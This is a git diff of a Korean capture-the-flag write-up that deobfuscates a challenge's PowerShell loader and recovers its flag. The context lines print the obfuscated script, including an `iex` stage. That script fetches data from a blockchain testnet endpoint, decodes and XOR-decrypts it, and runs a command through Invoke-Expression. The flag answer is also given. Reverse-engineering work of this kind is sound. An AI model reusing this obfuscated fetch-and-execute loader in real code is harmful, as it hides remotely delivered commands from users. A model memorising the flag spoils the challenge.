 (("{39}{64}{57}{45}{70}{59}{9}{66}{0}{31}{21}{50}{6}{56}{5}{22}{69}{71}{43}{60}{8}{35}{68}{44}{1}{19}{41}{30}{67}{38}{18}{7}{33}{54}{63}{34}{61}{24}{48}{4}{47}{3}{40}{51}{26}{42}{15}{37}{12}{10}{11}{52}{14}{23}{29}{53}{25}{16}{49}{55}{62}{36}{27}{28}{13}{17}{46}{20}{2}{65}{58}{32}"-f 'CSAKoY+K','xed','P dKoY+KoYohteM- doKoY+KoYhteMtseR-ekovnI(( eulaV- pser emaN- elbairaV-teS
@@ -1252,7 +1265,7 @@ noitarepo ROX')).REpLACE('DF9','|').REpLACE('KoY',[STrinG][cHaR]39).REpLACE(([cH
 
 <br />
 
-해독 안해봐도 `iex`다. 뒷 부분 지우고 한 번 더 실행한다.
+뒷 부분이 ~~해독을 해보지 않아도 딱 봐도~~ `iex`다. 해당 부분을 지우고 한 번 더 실행한다.
 
 ```js
 ('Set-Variable -Name testnet_endpo'+'int '+'-Value (7zI 7zI) Set-Variable -Name _body -Value (Pa1{7zImethod7zI:7zIeth_call7zI,7zIparams7zI:[{'+'7zIto7zI:7zIf6Kaddress7zI'+',7zIdata7zI:7zI0x5c880fcb7zI}, BLOCK],7zIid7zI:1,7'+'zIjsonrpc7zI:7zI2.07zI}Pa1) Set-Variable -Name resp -Value ((Invoke-RestMeth'+'od -Metho'+'d Pa1PostPa1 -Uri f6Ktestnet_endpoint -C'+'ontentType 7zIapplication/json7zI -Body f6K_body).result) #'+' Remove the Pa10xPa1 prefix Set-Variable -Name hexNumber -Value (f6Kresp -replace Pa10xPa1, Pa1Pa1) # Convert from hex to bytes '+'(ensuring pairs of hex characters) Set-Variable -Name bytes0 -Value (0..(f6KhexNumber.Length / 2 - 1) IOs '+'ForEach-Objec'+'t'+' { Set-Variable -Name startIndex -Value (f6K_ * 2) Set-Variable -Name'+' endIndex -Value (f6KstartI'+'ndex + 1) '+'  [Convert]::ToByte(f6KhexNumber.Substring(f6KstartIndex, 2), 16) }) Set-Variable -Name bytes1 -Value ([System.Text.Encoding]::UTF8.GetString(f6Kbytes0)) Set-Variabl'+'e -Name bytes2 -Value (f6Kbytes1.Substring(64, 188)) # Convert from base64 to bytes Set-Variable -Name bytesFromBase64 -Value ([Convert]::FromBase64Str'+'ing(f6Kbytes2)) Set-Variable '+'-Name resultAscii'+' -Value'+' ([System.T'+'ext.Encod'+'ing]::UTF8.G'+'etString(f6Kbyte'+'sFromBase64)) Set-Variable -Name hexBytes -Val'+'ue (f6Kresu'+'ltAscii IOs ForEach-Object { Pa1{0:X2}Pa1 -f f6K_  # Format each byte as two-digit hex with uppe'+'rcase letters }) Set-V'+'ariable -Name '+'hexString -Value (f6KhexBytes -join'+' Pa1 Pa1) #Write-Outp'+'ut f6Khe'+'xString Set-Variable -Name hexBytes -V'+'alue '+'(f6KhexBytes -replace 7zI 7zI, 7zI7zI) # Convert from'+' hex to bytes (ensuring pairs of hex characters) Se'+'t-Variable -Name bytes3 -Value (0..(f6KhexBytes.Length / 2 - 1) IOs ForEach-Object { Set-Variable -Name startIndex -Value (f6K_ * 2) Set-Va'+'riable -Name endIndex -Value (f6KstartIndex + 1) [Convert]::ToByte(f6KhexBytes.Substring(f6KstartIndex, 2), 16) }) Set-Variable -Name bytes5 -Value ([Text.Encoding]::UTF8.GetString(f6Kbytes3)) # Convert the key to bytes S'+'et-Variable -Name keyBytes -Value ([Text.Encoding]::ASCII.GetBytes(7zIFLAREON247zI)) # Perform the XOR operation Set-Variable'+' -Name resultBytes -Value (@()) for (Set-Variable -Name i -Value (0); f6Ki -lt f6Kbytes5.Length; f6Ki++) { Set-'+'Variable -Name resultBytes -Value (f6KresultBytes + (f6Kbytes5[f6Ki] -bxor f6KkeyBytes[f6Ki % f6KkeyBytes.Length])) } # Convert the res'+'u'+'lt ba'+'ck to a string (assuming ASCII encoding) Set-Variable -Name resultString -Value ([System.Text.Encoding]::'+'ASCII.'+'GetString(f6KresultBytes)) Set-Variable -N'+'ame command '+'-Value (7'+'zItar -x --use-compress-progr'+'am Pa1cmd /c echo f'+'6Kresu'+'ltString > C:WjZWjZfl'+'agPa1 -f C:WjZWjZflag7zI) Invoke-Expression f6Kcommand ').REPLAcE(([cHAR]102+[cHAR]54+[cHAR]75),[STRInG][cHAR]36).REPLAcE(([cHAR]80+[cHAR]97+[cHAR]49),[STRInG][cHAR]39).REPLAcE(([cHAR]87+[cHAR]106+[cHAR]90),'\').REPLAcE(([cHAR]55+[cHAR]122+[cHAR]73),[STRInG][cHAR]34).REPLAcE('IOs',[STRInG][cHAR]124)|.((varIABlE '*mdr*').NAmE[3,11,2]-JoIN'')
@@ -1307,7 +1320,7 @@ Set-Variable -Name command -Value ("tar -x --use-compress-program 'cmd /c echo $
 
 ## PoC
 
-위 파워쉘 코드를 재현하는 PoC코드를 작성하면 된다. 메소드에 대한 input 값은 앞서 다루었듯 BSCScan에서 가져온다. 어느 block이 flag에 관한 것인지 알 수 없으므로 전수조사를 실시한다. 만약 이것만으로 flag가 출력되지 않는다면 이 스마트 컨트랙트 또한 디컴파일하여 로직을 살펴볼 필요가 있다.
+위 파워쉘 코드를 재현하는 PoC코드를 작성하면 된다. 메소드에 대한 input 값은 앞서 다루었듯 BSCScan에서 가져온다. 어느 block이 flag에 관한 것인지 알 수 없으므로 각 block의 input 값들에 대하여 전수조사를 실시한다. 만약 이것만으로 flag가 출력되지 않는다면 이 스마트 컨트랙트 또한 디컴파일하여 로직을 살펴볼 필요가 있다.
 
 ```python
 import base64
@@ -1355,6 +1368,9 @@ if __name__=='__main__':
 flag가 잘 출력되었다. 
 
 `b'\x07v;)y3sxd\x08\x127\x16\x10(_bj Y{\x07zXr\x0feS-\x14\x0b\x04"w|v%\'=\x13g*.8X#/'`
+
 `b'N0t_3v3n_DPRK_i5_Th15_1337_1n_Web3@flare-on.com'`
+
 `b'Yet more noise!!'`
+
 `b'Good thing this is on the testnet'`
